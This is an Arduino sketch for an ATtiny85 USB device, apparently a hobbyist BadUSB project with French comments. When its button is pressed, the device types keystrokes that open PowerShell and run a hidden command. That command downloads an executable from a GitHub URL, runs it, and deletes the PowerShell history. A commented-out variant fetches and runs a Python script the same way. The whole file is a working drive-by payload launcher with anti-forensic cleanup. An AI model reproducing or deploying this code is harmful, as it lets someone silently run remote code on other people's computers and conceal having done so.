#include "DigiKeyboardFr.h"

#define LED    1
#define BUTTON 2

void setup() {
  // Configure la broche numérique
  pinMode(LED, OUTPUT);

  // Active la résistance de pull-up
  pinMode(BUTTON, INPUT_PULLUP);

  // Initialise la connexion
  DigiKeyboardFr.sendKeyStroke(0);
}

void loop() {
  digitalWrite(LED, HIGH);
  bool buttonState = digitalRead(BUTTON); // Low = bouton pressé

  // Lance le script si le bouton est pressé
  if (buttonState == LOW) {
    digitalWrite(LED, LOW);
    DigiKeyboardFr.delay(500);
    digitalWrite(LED, HIGH);

    // === Installe et exécute le payload ===
    // Ouvre l'exécuteur
    DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboardFr.delay(500);

    // Ouvre un powershell
    DigiKeyboardFr.print("powershell");
    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardFr.delay(500);

    // Récupère un script sur internet et l'exécute
    // Version C#
    DigiKeyboardFr.print("powershell -WindowStyle Hidden -Command \"iwr https://github.com/IAidenI/ATtiny85/raw/main/TryCatchMe/TryCatchMe.exe -OutFile $env:TEMP\\TryCatchMe.exe; Start-Process $env:TEMP\\TryCatchMe.exe; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; exit\"");
    // Version python
    //DigiKeyboardFr.print("Start-Process powershell -WindowStyle Hidden -ArgumentList '-Command \"if (Get-Command python -ErrorAction SilentlyContinue) { iwr https://github.com/IAidenI/ATtiny85/raw/main/TryCatchMe/TryCatchMe.pyw -OutFile $env:TEMP\\s.pyw; python $env:TEMP\\s.pyw }; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue\"'; exit");
    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardFr.delay(500);

    // Fait clignoté la LED pour indiquer que c'est terminé
    for (int i = 0; i < 3; i++) {
      digitalWrite(LED, LOW);
      DigiKeyboardFr.delay(500);
      digitalWrite(LED, HIGH);
      DigiKeyboardFr.delay(500);
    }
  }
}